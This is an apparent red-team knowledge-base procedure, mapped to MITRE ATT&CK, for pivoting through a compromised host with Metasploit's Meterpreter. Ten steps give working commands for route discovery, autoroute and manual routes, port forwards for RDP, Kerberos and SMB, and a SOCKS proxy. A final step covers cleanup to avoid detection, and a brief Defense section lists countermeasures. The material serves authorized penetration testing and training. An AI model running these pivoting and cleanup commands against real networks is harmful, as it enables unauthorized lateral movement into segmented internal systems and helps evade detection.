---
id: 4672cf37-9bf7-469e-824b-0ffad1c28c2a
name: Meterpreter-Network-Pivoting-via-Port-Forwarding-and-Routing
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.648756+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Connection Proxy|T1090 - Connection Proxy]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Network Pivoting Techniques]]'
commands:
  - '[[commands/meterpreter-portfwd-list]]'
  - '[[commands/meterpreter-portfwd-add-rdp]]'
  - '[[commands/meterpreter-portfwd-add-kerberos]]'
  - '[[commands/meterpreter-portfwd-add-smb]]'
  - '[[commands/meterpreter-portfwd-delete-rdp]]'
  - '[[commands/meterpreter-portfwd-flush]]'
  - '[[commands/meterpreter-autoroute-add-subnet]]'
  - '[[commands/msf-use-socks-proxy-module]]'
  - '[[commands/msf-set-socks-srvport]]'
  - '[[commands/msf-set-socks-version]]'
  - '[[commands/meterpreter-autoroute-list-routes]]'
  - '[[commands/meterpreter-route-view]]'
  - '[[commands/meterpreter-route-add-network]]'
  - '[[commands/meterpreter-route-delete-network]]'
  - '[[commands/meterpreter-route-flush]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Meterpreter-Network-Pivoting-via-Port-Forwarding-and-Routing

## Summary

This procedure outlines how to use Metasploit's Meterpreter payload for network pivoting through port forwarding and route manipulation. It enables attackers to proxy traffic via a compromised host to reach internal network segments, bypassing segmentation and accessing otherwise isolated systems or data.

## Description

Meterpreter, part of the Metasploit Framework, allows dynamic port forwarding and route addition on a compromised host, turning it into a pivot point for lateral movement. This is particularly useful in segmented networks where direct access to internal resources is blocked. The technique involves establishing a Meterpreter session, configuring port forwards for specific services like RDP or SMB, and adding routes to subnets using the autoroute module or direct route commands. It maps to MITRE ATT&CK techniques for connection proxying and remote services, commonly used in red team engagements to simulate advanced persistent threats.

## Requirements

1. Active Meterpreter session on a compromised host with network access to target segments.
2. Metasploit Framework installed on the attacker's system.
3. Knowledge of target network subnets, session IDs, and service ports (e.g., 3389 for RDP, 445 for SMB).
4. Listener setup (e.g., msfconsole) to handle forwarded traffic.

## Defense

- Implement network segmentation with firewalls to limit lateral movement and monitor for anomalous traffic patterns.
- Enable logging for proxy and tunneling activities, such as unusual port forwards or route changes on endpoints.
- Use endpoint detection tools to identify Meterpreter processes and unauthorized network connections.
- Regularly audit and restrict administrative privileges that could enable route manipulation.

## Objectives

1. Establish pivoting capabilities through a compromised host to access internal networks.
2. Forward traffic for specific services to enable remote access or exploitation.
3. Add and manage routes to reach isolated subnets for further lateral movement.
4. Clean up configurations to avoid detection post-operation.

## Instructions

### Step 1: View Available Networks on Compromised Host

**Context**: Before adding routes or forwards, assess the networks accessible from the compromised host to identify pivot opportunities. This helps determine which subnets can be routed through the session.

**Command** ([[commands/meterpreter-route-view]]):
```msfconsole
route
```

This command displays the routing table and interfaces visible to the Meterpreter session. Look for internal subnets not directly accessible from your attack machine.

### Step 2: List Existing Port Forwards

**Context**: Check for any active port forwards to avoid conflicts and verify current pivoting setup. This is essential before adding new forwards.

**Command** ([[commands/meterpreter-portfwd-list]]):
```msfconsole
portfwd list
```

Expected output includes a table of active forwards with local/remote ports and hosts.

### Step 3: Add Routes Using Autoroute for a Subnet

**Context**: Use the autoroute post module to automatically add routes for a specific subnet, enabling traffic proxying through the Meterpreter session without manual IP configuration.

**Command** ([[commands/meterpreter-autoroute-add-subnet]]):
```msfconsole
run autoroute -s $_SUBNET
```

Replace $_SUBNET with the target, e.g., 192.168.15.0/24. This injects routes into the Metasploit routing table.

### Step 4: Manually Add a Route for a Specific Network

**Context**: For finer control or when autoroute is insufficient, manually add a route using the session ID. This is useful for targeting specific networks via the pivot host.

**Command** ([[commands/meterpreter-route-add-network]]):
```msfconsole
route add $_NETWORK $_NETMASK $_SESSION_ID
```

Example: route add 192.168.14.0 255.255.255.0 3. Verify with list routes command.

### Step 5: Set Up Port Forward for RDP Traffic

**Context**: Forward RDP (port 3389) from your local machine through the compromised host to a target internal machine, allowing remote desktop access via the pivot.

**Command** ([[commands/meterpreter-portfwd-add-rdp]]):
```msfconsole
portfwd add -l 3389 -p 3389 -r $_TARGET_HOST
```

$_TARGET_HOST is the internal target's IP from the compromised host's perspective. Connect to localhost:3389 on your machine to reach the target.

### Step 6: Set Up Port Forward for Kerberos Traffic

**Context**: Forward Kerberos (port 88) traffic to enable authentication-related attacks or access on the internal network.

**Command** ([[commands/meterpreter-portfwd-add-kerberos]]):
```msfconsole
portfwd add -l 88 -p 88 -r 127.0.0.1
```

This loops back to the compromised host itself for local service access.

### Step 7: Set Up Port Forward for SMB Traffic

**Context**: Forward SMB (port 445) to access file shares or perform enumeration/exploitation on internal systems.

**Command** ([[commands/meterpreter-portfwd-add-smb]]):
```msfconsole
portfwd add -L 0.0.0.0 -l 445 -r $_REMOTE_HOST -p 445
```

$_REMOTE_HOST is the target IP, e.g., 192.168.57.102. Use -L for local bind on all interfaces.

### Step 8: Configure SOCKS Proxy for General Pivoting

**Context**: Set up a SOCKS proxy in Metasploit to route arbitrary traffic through the pivot host, useful for tools like nmap or browsers.

**Command** ([[commands/msf-use-socks-proxy-module]]):
```msfconsole
use auxiliary/server/socks_proxy
```

**Command** ([[commands/msf-set-socks-srvport]]):
```msfconsole
set SRVPORT $_PORT
```

Example: set SRVPORT 9090.

**Command** ([[commands/msf-set-socks-version]]):
```msfconsole
set VERSION $_VERSION
```

Example: set VERSION 4a. Run the module to start the proxy.

### Step 9: List Active Routes

**Context**: Verify added routes are active and correctly configured for the pivot.

**Command** ([[commands/meterpreter-autoroute-list-routes]]):
```msfconsole
run autoroute -p
```

This prints the current autoroute table.

### Step 10: Clean Up Port Forwards and Routes

**Context**: Remove configurations to minimize footprint and avoid detection. Start with specific deletes, then flush all.

**Command** ([[commands/meterpreter-portfwd-delete-rdp]]):
```msfconsole
portfwd delete -l 3389 -p 3389 -r $_TARGET_HOST
```

**Command** ([[commands/meterpreter-portfwd-flush]]):
```msfconsole
portfwd flush
```

**Command** ([[commands/meterpreter-route-delete-network]]):
```msfconsole
route delete $_NETWORK $_NETMASK $_SESSION_ID
```

**Command** ([[commands/meterpreter-route-flush]]):
```msfconsole
route flush
```

Expected output: Confirmation messages like "Route deleted" or empty lists post-flush.
